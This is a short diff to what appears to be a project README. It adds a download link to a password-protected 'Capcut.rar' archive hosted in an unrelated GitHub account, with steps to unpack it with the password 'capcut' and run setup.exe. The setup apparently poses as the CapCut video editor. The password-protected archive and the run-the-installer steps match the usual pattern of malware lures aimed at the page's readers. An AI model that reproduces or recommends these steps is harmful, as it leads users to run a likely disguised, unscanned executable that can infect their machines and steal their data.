@@ -2,7 +2,7 @@
 
 <H3>How to use</H3>
 
-- [Download]()
+- [Download](https://github.com/m19307/capcut/releases/download/Download/Capcut.rar)
 - Open archive (password: capcut)
 - Open setup.exe for download all components and install
 - Follow the instruction
